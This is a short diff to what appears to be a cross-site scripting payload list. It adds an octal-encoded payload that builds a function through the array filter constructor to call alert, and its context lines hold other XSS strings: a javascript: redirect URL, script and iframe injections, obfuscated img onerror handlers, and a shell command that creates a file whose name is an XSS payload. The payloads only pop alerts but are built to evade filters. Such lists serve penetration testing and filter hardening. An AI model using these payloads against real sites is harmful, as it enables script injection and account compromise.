@@ -171,6 +171,7 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 ''"><script>(1)</script><iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=spider></iFramE>
 <img+src=oNlY=1+ onerror="alert(['a', 'x', 'b', 'x', 'c', 's'].map(c => c.replace(/[abc]/g, '')).join(''))">
 <img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()
 
 # Create file whith payload XSS.
 touch '"><img src=x onerror=alert("xss!")>.pdf'
